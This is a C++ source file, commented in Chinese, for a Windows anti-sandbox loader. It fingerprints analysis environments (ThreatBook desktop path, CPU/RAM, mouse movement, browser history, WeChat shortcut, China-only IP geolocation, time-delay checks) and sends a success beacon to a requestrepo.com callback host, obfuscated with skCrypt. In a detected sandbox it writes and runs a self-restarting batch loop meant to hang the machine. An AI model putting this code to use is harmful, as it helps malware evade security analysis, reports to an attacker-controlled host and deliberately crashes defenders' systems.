#include "header.h"

//搭配skCrypter加密
std::string charToString(const char* str) {
    return std::string(str);
}
//检测微步释放路径 2024年7月26日 微步更新了 更简单的释放路径
std::string workingdir()
{
    char buf[256];
    GetCurrentDirectoryA(256, buf);
    return std::string(buf);
}
bool check_run_path() {
    std::string test = workingdir();
    std::string desktop_path = "C:\\Users\\Administrator\\Desktop";
    if (test == desktop_path) {
        return false;
    }
    return true;
}
//WaitForSingleObject延迟，利用拼多多时间戳api判断差值
bool check_time() {
    auto url = ("http://api.pinduoduo.com");
    httplib::Client cli(url);
    auto res = cli.Get("/api/server/_stm");
    std::string time_str1;
    if (res->status == 200) {
        for (char c : res->body) {
            if (c >= '0' && c <= '9') {
                time_str1 += c;
            }
        }
    }
    else {
        return false;
    }
    long long api_time1 = std::stoll(time_str1);
    time_t currentTime1 = time(0);
    //开始休眠300秒
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    WaitForSingleObject(hEvent, 300000);//300s
    CloseHandle(hEvent);
    res = cli.Get("/api/server/_stm");
    std::string time_str2;
    if (res->status == 200) {
        for (char c : res->body) {
            if (c >= '0' && c <= '9') {
                time_str2 += c;
            }
        }
    }
    else {
        return false;
    }
    long long api_time2 = std::stoll(time_str2);
    //判断差值
    if (api_time2 - api_time1 > 290000) {
        return true;
    }
    else {
        exit(0);
        return false;
    }
}
//CPU核心数为中敏感方法，可抛弃
bool check_cpu() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    //建议设置6及以上
    if (numberOfProcessors < 6) {
        return false;
    }
    else {
        return true;
    }
}
//ram内存大小为低敏感方法
bool check_ram() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    return (RAMMB >= 8192);
}
//判断是否非中国ip
bool check_ip() {
    auto url = "http://ip-api.com";
    httplib::Client cli(url);
    auto res = cli.Get("/csv");
    std::string ip_str;
    if (res->status == 200) {
        for (char c : res->body) {
            ip_str += c;
        }
    }
    else {
        exit(0);
        return false;
    }
    if (ip_str.find("China") != std::string::npos) {
        //std::cout << "The string contains 'China'." << std::endl;
        return true;
    }
    else {
        //std::cout << "The string does not contain 'China'." << std::endl;
        exit(0);
        return false;
    }
}
//判断鼠标
double distance(POINT p1, POINT p2) {
    double dx = p2.x - p1.x;
    double dy = p2.y - p1.y;
    return sqrt(dx * dx + dy * dy);
}
bool check_mouse() {
    POINT p1, p2, p3;
    GetCursorPos(&p1);
    Sleep(3000);
    GetCursorPos(&p2);
    Sleep(3000); 
    GetCursorPos(&p3);
    double d1 = distance(p1, p2);
    double d2 = distance(p2, p3);
    double d3 = distance(p3, p1);
    // 检查是否能构成一个类三角形
    if ((d1 + d2 > d3) && (d2 + d3 > d1) && (d1 + d3 > d2)) {
        return true;
    }
    else {
        return false;
    }
}
std::string wstringToString(const std::wstring& wstr) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}
//判断edge浏览器的本地浏览记录是否大于20kb,建议在win10及以上的目标启用
bool check_edge() {
    wchar_t username[256 + 1];
    DWORD username_len = 256 + 1;
    GetUserName(username, &username_len);
    std::string uname = wstringToString(username);
    std::string filePath = "C:\\Users\\" + uname + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History";
    // 检查文件是否存在
    if (GetFileAttributesA(filePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        // 文件不存在
        return FALSE;
    }
    // 获取文件大小
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // 无法打开文件
        return FALSE;
    }
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        // 获取文件大小失败
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);
    // 比较文件大小与20KB
    const DWORDLONG TwentyKB = 20 * 1024;
    if (fileSize.QuadPart > TwentyKB) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}
//判断微信的快捷方式是否存在，微信安装时会自动在C:\Users\Public\Desktop下创建快捷方式，无需获取系统用户名，此方法不敏感
bool check_wechat() {
    std::string filePath = "C:\\Users\\Public\\Desktop\\微信.lnk";
    // 检查文件是否存在
    if (GetFileAttributesA(filePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        // 文件不存在
        return FALSE;
    }
    else {
        return TRUE;
    }
}
//判断给的参数是否满足条件 x+y=10,x*y=24,启动时附带参数Anti-Sandbox.exe 4 6 才可成功启动
bool check_args(char* argv[]) {
    if (atoi(argv[1]) + atoi(argv[2]) != 10 && atoi(argv[1]) * atoi(argv[2]) != 24) {
            return false;
    }
    else {
        return true;
    }
}
//判断质数 循环30次 结束返回true，占用CPU导致延迟
bool check_isprime() {
    for (int i = 0; i < 30; i++) {
        long long n1 = 1000000000000002493;
        if (n1 <= 1)
            return false;

        for (long long i = 2; i * i <= n1; ++i) {
            if (n1 % i == 0)
                return false;
        }
    }
    return true;
}
bool check_disk() {
    char drive[] = { 'D', ':', '\\', '*', '\0' };
    WIN32_FIND_DATAA findData;
    HANDLE hFile = FindFirstFileA(drive, &findData);
    int count = 0;

    if (hFile == INVALID_HANDLE_VALUE) {
        return false; // 如果无法打开目录，返回false
    }

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            if (++count > 20) {
                FindClose(hFile);
                return true; // 如果数量超过20，则提前返回true
            }
        }
    } while (FindNextFileA(hFile, &findData));

    FindClose(hFile);
    return false; // 如果没有超过20，返回false
}
int main(int argc, char* argv[]) {
    /*
    //用于提示已经成功执行
    if (check_args(argv)) {
        //dnslog地址 可自行更换或者不使用
        //使用了skCrypt库加密字符串 防止静态分析发现dnslog地址
        auto url = skCrypt("qk5p7fr7.requestrepo.com");
        httplib::Client cli(charToString(url));
        httplib::Params p;
        p.emplace("success", "true");
        auto res = cli.Post("/", p);
        MessageBoxA(NULL, "SUCCESS", "SUCCESS", NULL);
    }
    else {
        MessageBoxA(NULL, "Fail", "Fail", NULL);
    }
    */
    if (check_disk()) {
        //dnslog地址 可自行更换或者不使用
        //使用了skCrypt库加密字符串 防止静态分析发现dnslog地址
        auto url = skCrypt("qk5p7fr7.requestrepo.com");
        httplib::Client cli(charToString(url));
        httplib::Params p;
        p.emplace("success", "true");
        auto res = cli.Post("/", p);
        MessageBoxA(NULL, "SUCCESS", "SUCCESS", NULL);
    }
    else {
        MessageBoxA(NULL, "Fail", "Fail", NULL);
        //新增一个若当前环境为沙箱则执行o.bat，o.bat内容为：@echo off & echo :o & echo start o.bat
        //导致循环运行命令行窗口导致目标机器死机 测试请在虚拟机测试！
        system("(echo :o && echo start o.bat && echo goto o) > %temp%/o.bat");
        system("cd %temp% && o.bat");
    }
}